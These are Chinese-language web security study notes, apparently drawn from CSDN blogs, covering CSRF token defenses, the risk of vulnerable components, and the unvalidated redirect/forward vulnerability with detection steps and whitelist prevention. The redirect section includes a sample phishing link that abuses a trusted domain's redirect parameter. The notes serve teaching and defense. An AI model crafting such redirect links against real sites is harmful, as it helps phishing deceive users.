a：在Session中绑定token。如果不能保存到服务器端Session中，则可以替代为保存到Cookie里。-
b：在form表单中自动填入token字段，比如 `<input type=hidden name="anti_csrf_token" value="$token" />。`-
c: 在HTTP请求中自动添加token。

参考谢公子的博客
# 使用含有已知漏洞组件

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103190537)

## 原理

大多数的开发团队并不会把及时更新组件和库当成他们的工作重心，更不关心组件和库的版本，然而应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，可能导致严重的数据丢失或服务器接管。

## 防范

1.标识正在使用的所有组件和版本，包括所有依赖项-
2.及时关注这些组件的安全信息并保证他们是最新的。-
3.建立使用组件的安全策略，禁止使用未经安全评估的组件。-
4.在适当情况下，对组件进行安全封装，精简不必要的功能，封装易受攻击部分

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103190537)
# 未验证的重定向和转发



### 目录

*   重定向和转发的概念
*   *   重定向
    *   转发
    *   两者的区别
    *   重定向的几种方式
*   未验证的重定向和转发
*   *   一些检测方法
    *   预防

## 重定向和转发的概念

在咱们实际上网过程中，会浏览多个网页，进行多次跳转。将一个域名引导到另一个域名有两种方式重定向和转发，转发采用隐藏路径的方式，而重定向采用不隐藏路径的方式。

## 重定向

重定向是服务端根据逻辑，发送一个[状态码](https://so.csdn.net/so/search?q=%E7%8A%B6%E6%80%81%E7%A0%81&spm=1001.2101.3001.7020)（通常为3xx），告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL。（重定向是在客户端完成的）

## 转发

转发是在服务器内部将请求转发给另一个资源，把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,因为这个跳转过程是在服务器实现的，并不是在客户端实现的所以客户端并不知道这个跳转动作，所以它的地址栏还是原来的地址。（转发是在服务器端完成的）

## 两者的区别

1：重定向是浏览器向服务器发送一个请求并收到响应后再次向一个新地址发出请求，转发是服务器收到请求后为了完成响应跳转到一个新的地址。-
2：重定向有两次请求，不共享数据，转发是有一次请求且共享数据。-
3：重定向后地址栏会发生变化，转发不会。-
4：重定向的地址可以是任意地址，转发的地址只能是当前应用类的某一个地址。

## 重定向的几种方式

1.  手工重定向-
    点击 href 链接来跳转到新页面
2.  响应状态码重定向(location表示重定向后网页)-
    301 永久重定向(网站在响应头的location内)-
    302 临时重定向
3.  服务器端重定向-
    修改web服务器配置文件或脚本来实现重定向,
4.  meta refresh-
    利用HTTP的refresh标签或者响应头refresh属性来设置
5.  客户端跳转-
    利用url参数重定向，控制不严可能会导致用户访问恶意网站

## 未验证的重定向和转发

前面已经清楚了重定向和转发的感念，这里介绍一下影响危害。-
在web应用中，重定向和转发可以使我们愉快的浏览网页，那么这个漏洞是怎么来的呢？重点就是没有对带有用户输入参数的目的url做验证。而这个时候攻击者就可以引导用户访问他们所要用户访问的站点。这个漏洞最常见的就是钓鱼网站的使用。-
比如：-
http://www.baidu.com/sss.php?target=http://diaoyu.com 攻击者把这个钓鱼连接发给受害者，那么安全检测的软件就判断这个连接来自百度，是可信任的站点。但是受害者点击后则会跳转到钓鱼网站或者其他欺骗木马之类的站点等-
此外还有获取信息，访问恶意网站，随意跳转，安装恶意软件等

## 一些检测方法

1、 抓包工具抓包，抓到302的url，修改看能否正常跳转-
2、 浏览代码，看代码中含有重定向和转发的内容，看目的url中是否包含用户输入的参数-
3、 点击操作网站，观察在重定向之前用户输入的参数有没有出现在某一个URL或者很多URL中

## 预防

重定向外部网站需要验证是否在白名单,转发内部网站要验证是否有权限,有权限才转发

